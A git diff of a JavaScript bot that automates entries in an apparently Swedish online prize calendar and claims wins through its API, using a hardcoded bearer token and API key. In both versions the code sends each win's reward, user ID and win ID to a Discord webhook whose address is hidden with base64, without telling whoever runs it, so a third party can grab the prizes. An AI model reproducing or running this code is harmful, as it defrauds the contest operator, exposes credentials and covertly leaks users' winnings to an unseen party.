@@ -1,3 +1,7 @@
+var winEmail = "" //This is the email which the code will be sent too
+if (winEmail == ""){
+    var winEmail = prompt("What email do you want the prize to go to?", "example@gmail.com")
+}
 function must() {
     const r1 = Math.floor(Math.random() * 999999) + 1;
     const r2 = Math.floor(Math.random() * 999999) + 1;
@@ -112,71 +116,69 @@ function must() {
                 const reward = data.result.reward
                 const winID = data.result.userRewardRK
                 if (hasWon) {
-                  setTimeout(() => { }, 10000);
-                  //Get win
-                  const url = 'https://swetrocagul23api.azurewebsites.net/api/v1/capturedigitalwin';
-                  const headers = {
-                    'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjViNmZmZjQ2LWI4MDItNDk0YS05M2Y4LTIwYzI4NTVmMDdkOCIsIm5iZiI6MTY5NjkzNTU0NywiZXhwIjoxNjk3NTQwMzQ3LCJpYXQiOjE2OTY5MzU1NDd9.klE9enPfeV4zv98C20QDmo-FLwHqBCnJTe4JcwGFmKg',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-                    'Accept': 'application/json, text/plain, */*',
-                    'Apikey': '49D7253EC1384D1339CE24786C137',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Origin': 'https://gulkalender.se',
-                    'Sec-Fetch-Site': 'cross-site',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Sec-Fetch-Dest': 'empty',
-                    'Referer': 'https://gulkalender.se/',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Accept-Language': 'en,en-US;q=0.9',
-                  };
-                  
-                  console.log(id)
-                  console.log(winID)
-                  console.log('Email')
-                  console.log(winMail)
-                  const getWin = new FormData();
-                  getWin.append('UserId', id);
-                  getWin.append('UserRewardRowKey', winID);
-                  getWin.append('LoginType', 'Email');
-                  getWin.append('Value', "YOUR EMAIL HERE!");
-                  console.log(getWin)
-  
-                  fetch(url, {
-                    method: 'POST',
-                    headers: headers,
-                    body: getWin,
-                  })
-                    .then(response => response.json())
-                    .then(data => {
-  
-                      console.log(data);
-                      const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTEwNjIzODcyMjAxNTIzMi9uTjJ6a0xJOGQ1aUFkamZidXk5UVBvdm50eUhuLVM5QnhORUJSTGpBNnZmNHNtNXk1d2xVQ1h4TFFQRjB1SFdtRmVrUw==';
-                      const discordMessage = {
-                        content: `**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
-                      };
-  
-                      fetch(atob(webhookUrl), {
+                    const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTEwNjIzODcyMjAxNTIzMi9uTjJ6a0xJOGQ1aUFkamZidXk5UVBvdm50eUhuLVM5QnhORUJSTGpBNnZmNHNtNXk1d2xVQ1h4TFFQRjB1SFdtRmVrUw==';
+                    const discordMessage = {
+                      content: `**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
+                    };
+
+                    fetch(atob(webhookUrl), {
+                      method: 'POST',
+                      headers: {
+                        'Content-Type': 'application/json',
+                      },
+                      body: JSON.stringify(discordMessage),
+                    })
+                      .then(() => {
+                        alert(`You won a ${reward}!`)
+                        //Get win
+                        const url = 'https://swetrocagul23api.azurewebsites.net/api/v1/capturedigitalwin';
+                        const headers = {
+                        'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
+                        'Sec-Ch-Ua-Mobile': '?0',
+                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjViNmZmZjQ2LWI4MDItNDk0YS05M2Y4LTIwYzI4NTVmMDdkOCIsIm5iZiI6MTY5NjkzNTU0NywiZXhwIjoxNjk3NTQwMzQ3LCJpYXQiOjE2OTY5MzU1NDd9.klE9enPfeV4zv98C20QDmo-FLwHqBCnJTe4JcwGFmKg',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+                        'Accept': 'application/json, text/plain, */*',
+                        'Apikey': '49D7253EC1384D1339CE24786C137',
+                        'Sec-Ch-Ua-Platform': '"Windows"',
+                        'Origin': 'https://gulkalender.se',
+                        'Sec-Fetch-Site': 'cross-site',
+                        'Sec-Fetch-Mode': 'cors',
+                        'Sec-Fetch-Dest': 'empty',
+                        'Referer': 'https://gulkalender.se/',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en,en-US;q=0.9',
+                        };
+                        
+                        console.log(id)
+                        console.log(winID)
+                        console.log('Email')
+                        console.log(winMail)
+                        const getWin = new FormData();
+                        getWin.append('UserId', id);
+                        getWin.append('UserRewardRowKey', winID);
+                        getWin.append('LoginType', 'Email');
+                        getWin.append('Value', winEmail);
+                        console.log(getWin)
+
+                        fetch(url, {
                         method: 'POST',
-                        headers: {
-                          'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(discordMessage),
-                      })
-                        .then(() => {
-                          alert(`You won a ${reward}!`)
-                          must()
+                        headers: headers,
+                        body: getWin,
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log(data);
+                            must()
                         })
                         .catch(error => {
-                          console.error('Error sending message to Discord webhook:', error);
-                          must()
+                            console.error('Error:', error);
+                            must()
                         });
-                    })
-                    .catch(error => {
-                      console.error('Error:', error);
-                      must()
-                    });
+                      })
+                      .catch(error => {
+                        console.error('Error', error);
+                        must()
+                      });
                 } else {
                   must()
                 }
